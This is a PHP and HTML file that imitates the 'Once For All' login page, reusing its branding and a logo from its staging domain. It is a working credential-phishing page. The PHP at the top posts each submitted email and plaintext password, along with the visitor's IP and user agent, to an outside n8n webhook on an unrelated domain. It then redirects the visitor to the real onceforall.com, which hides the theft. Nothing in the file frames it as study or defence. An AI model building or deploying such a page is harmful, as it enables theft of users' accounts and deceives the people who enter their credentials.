<?php
// ---- Utilidad para obtener la IP del cliente (respetando proxies/CDN) ----
function getClientIp(): string {
    $candidates = ['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'];
    foreach ($candidates as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = $_SERVER[$key];
            if ($key === 'HTTP_X_FORWARDED_FOR') {
                $parts = explode(',', $ip);
                $ip = trim($parts[0]);
            }
            return trim($ip);
        }
    }
    return '';
}

$clientIp = getClientIp();

// ---- Manejo del envío ----
$apiUrl = 'https://n8n.cast1llo.com/webhook/95da625a-d94c-4987-833a-53bedbbf726c';
$resultMsg = null;
$resultType = null; // 'success' | 'error'

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $clientIpFromForm = isset($_POST['client_ip']) ? trim($_POST['client_ip']) : null;

    if ($email === '' || $password === '') {
        $resultType = 'error';
        $resultMsg = 'Por favor, completa email y contraseña.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $resultType = 'error';
        $resultMsg = 'El email no tiene un formato válido.';
    } else {
        $payload = json_encode([
            'email'       => $email,
            'password'    => $password,
            'ip'          => $clientIp,
            'ip_form'     => $clientIpFromForm,
            'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? null,
            'timestamp'   => date('c')
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        $ch = curl_init($apiUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json','Accept: application/json'],
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_TIMEOUT => 15,
        ]);

        $responseBody = curl_exec($ch);
        $curlErrNo = curl_errno($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($curlErrNo) {
            $resultType = 'error';
            $resultMsg = 'No se pudo contactar con el servicio de autenticación. Inténtalo más tarde.';
        } else {
            $json = json_decode($responseBody, true);
            if ($httpCode >= 200 && $httpCode < 300) {
                $resultType = 'success';
                $resultMsg = 'Login correcto.';
                header("Location: https://onceforall.com");
                die();
            } else {
                $apiError = is_array($json) && isset($json['error']) ? $json['error'] : null;
                $apiMessage = is_array($json) && isset($json['message']) ? $json['message'] : null;
                $resultType = 'error';
                $resultMsg = $apiMessage ?? $apiError ?? "Error de autenticación (HTTP $httpCode).";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
  <title>Once For All - Login</title>

  <!-- Tailwind via CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            brand: '#e4007f',
            ink: '#2e2e72'
          },
          fontFamily: {
            ui: ['Segoe UI','system-ui','-apple-system','Roboto','sans-serif']
          },
        }
      }
    }
  </script>

  <!-- Small helper styles for the subtle background pattern -->
  <style>
    .bg-grid {
      background-image:
        radial-gradient(circle at 1px 1px, rgba(0,0,0,.05) 1px, transparent 0);
      background-size: 24px 24px;
    }
  </style>
</head>
<body class="min-h-svh bg-white text-slate-800 antialiased font-ui">

  <!-- Top bar -->
  <header class="absolute inset-x-0 top-0">
    <div class="mx-auto w-full max-w-3xl px-6 pt-6 flex items-center justify-between">
      <img
        class="h-7 sm:h-8"
        src="https://identity.staging.onceforall.com/auth/resources/hiu4o/login/portal-sywa/img/onceforall-logo.svg"
        alt="Once For All"
      />
      <button
        type="button"
        class="inline-flex items-center gap-1 text-sm font-semibold text-slate-700"
        aria-label="Change language"
      >
        EN <span aria-hidden="true">▾</span>
      </button>
    </div>
  </header>

  <!-- Page -->
  <main class="relative isolate flex min-h-svh items-center">
    <!-- decorative background -->
    <div class="pointer-events-none absolute inset-0 -z-10 bg-grid"></div>
    <div class="pointer-events-none absolute inset-0 -z-20 bg-[radial-gradient(60%_40%_at_50%_0%,#f4f6f9_0%,#ffffff_60%)]"></div>

    <!-- Center column -->
    <div class="mx-auto w-full max-w-3xl px-6 pb-10 pt-28 sm:pt-32">
      <h1 class="text-3xl sm:text-4xl font-bold tracking-tight text-ink">
        Welcome back to sywa
      </h1>

      <?php if ($resultMsg !== null): ?>
        <div class="mt-4 rounded-xl border px-4 py-3 text-sm
                    <?php echo $resultType === 'success'
                      ? 'border-green-200 bg-green-50 text-green-800'
                      : 'border-rose-200 bg-rose-50 text-rose-800'; ?>">
          <?php echo htmlspecialchars($resultMsg, ENT_QUOTES, 'UTF-8'); ?>
        </div>
      <?php endif; ?>

      <form action="" method="POST" novalidate class="mt-6 space-y-4">
        <input type="hidden" name="client_ip" value="<?php echo htmlspecialchars($clientIp, ENT_QUOTES, 'UTF-8'); ?>">

        <label for="email" class="sr-only">Email</label>
        <input
          id="email"
          type="email"
          name="email"
          placeholder="User email"
          value="<?php echo isset($email) ? htmlspecialchars($email, ENT_QUOTES, 'UTF-8') : ''; ?>"
          required
          autocomplete="username"
          class="w-full rounded-2xl border border-slate-300 bg-white px-4 py-3.5 text-base shadow-sm outline-none
                 focus-visible:ring-4 focus-visible:ring-brand/20"
        />

        <label for="password" class="sr-only">Password</label>
        <input
          id="password"
          type="password"
          name="password"
          placeholder="Password"
          required
          autocomplete="current-password"
          class="w-full rounded-2xl border border-slate-300 bg-white px-4 py-3.5 text-base shadow-sm outline-none
                 focus-visible:ring-4 focus-visible:ring-brand/20"
        />

        <div class="flex items-center justify-end">
          <a href="#" class="text-sm font-medium text-sky-700 hover:underline">Forgot your password?</a>
        </div>

        <button
          type="submit"
          class="w-full rounded-full bg-brand px-6 py-4 text-base font-semibold text-white shadow-sm
                 hover:opacity-95 focus-visible:outline-none focus-visible:ring-4 focus-visible:ring-brand/30"
        >
          Log in
        </button>

        <!-- Divider -->
        <div class="flex items-center gap-3 py-2">
          <div class="h-px flex-1 bg-slate-200"></div>
          <span class="text-xs font-medium text-slate-500">OR</span>
          <div class="h-px flex-1 bg-slate-200"></div>
        </div>

        <p class="text-center text-sm text-slate-700">
          No account yet?
          <a href="#" class="font-semibold text-sky-700 hover:underline">Join us</a>
        </p>
      </form>

      <!-- Footer logos (decorative) -->
      <div class="mt-10 flex items-center justify-center gap-6 opacity-60">
        <!-- simple neutral icons -->
        <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/></svg>
        <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M4 12h16M12 4v16" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
        <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><rect x="4" y="6" width="16" height="12" rx="2" stroke="currentColor" stroke-width="2"/></svg>
        <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M3 12h6l3-8 3 16 3-8h3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M12 3v18M3 12h18" stroke="currentColor" stroke-width="2"/></svg>
        <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M5 5h14v14H5z" stroke="currentColor" stroke-width="2"/></svg>
      </div>
    </div>
  </main>
</body>
</html>
